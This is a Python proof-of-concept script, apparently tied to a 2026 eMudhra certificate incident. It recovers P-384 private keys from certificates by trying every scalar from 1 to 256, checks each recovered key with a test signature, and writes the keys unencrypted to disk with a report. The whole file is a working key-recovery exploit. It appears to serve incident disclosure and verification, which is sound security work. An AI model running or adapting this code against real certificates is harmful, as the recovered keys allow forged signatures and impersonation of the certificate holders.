"""Recover weak P-384 scalars by enumerating d in 1..256 (eMudhra 2026 incident PoC)."""
from __future__ import annotations

import json
from pathlib import Path

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.asymmetric.utils import Prehashed

DIR = Path(__file__).resolve().parent
OUT = DIR / "recovered-private-keys"
OUT.mkdir(exist_ok=True)


def pub_der(key: ec.EllipticCurvePublicKey) -> bytes:
    return key.public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )


def try_recover(pub: ec.EllipticCurvePublicKey) -> int | None:
    target = pub_der(pub)
    for d in range(1, 257):
        candidate = ec.derive_private_key(d, ec.SECP384R1()).public_key()
        if pub_der(candidate) == target:
            return d
    return None


def verify_sign(priv: ec.EllipticCurvePrivateKey, pub: ec.EllipticCurvePublicKey) -> bool:
    msg = b"emudhra-weak-key-recovery-check"
    digest = hashes.Hash(hashes.SHA384())
    digest.update(msg)
    dgst = digest.finalize()
    sig = priv.sign(dgst, ec.ECDSA(Prehashed(hashes.SHA384())))
    pub.verify(sig, dgst, ec.ECDSA(Prehashed(hashes.SHA384())))
    return True


def main() -> None:
    rows: list[dict] = []
    for cert_path in sorted(DIR.glob("EM_*.pem")):
        cert = x509.load_pem_x509_certificate(cert_path.read_bytes())
        pub = cert.public_key()
        if not isinstance(pub, ec.EllipticCurvePublicKey):
            raise TypeError(f"{cert_path.name}: not EC")
        d = try_recover(pub)
        if d is None:
            raise RuntimeError(f"{cert_path.name}: scalar not found in 1..256")

        priv = ec.derive_private_key(d, ec.SECP384R1())
        verify_sign(priv, pub)

        stem = cert_path.stem
        pem = priv.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        )
        (OUT / f"{stem}_d{d}.pem").write_bytes(pem)

        cn = cert.subject.get_attributes_for_oid(x509.oid.NameOID.COMMON_NAME)[0].value
        rows.append(
            {
                "file": cert_path.name,
                "cn": cn,
                "scalar_d": d,
                "private_key_pem": OUT / f"{stem}_d{d}.pem",
                "verified_sign": True,
            }
        )
        print(f"{cn}: d={d} (verified)")

    (OUT / "recovery_report.json").write_text(
        json.dumps(rows, indent=2, default=str), encoding="utf-8"
    )
    summary = "\n".join(f"{r['cn']}\td={r['scalar_d']}" for r in rows) + "\n"
    (OUT / "scalars.txt").write_text(summary, encoding="utf-8")
    print(f"\nWrote {len(rows)} keys to {OUT}")


if __name__ == "__main__":
    main()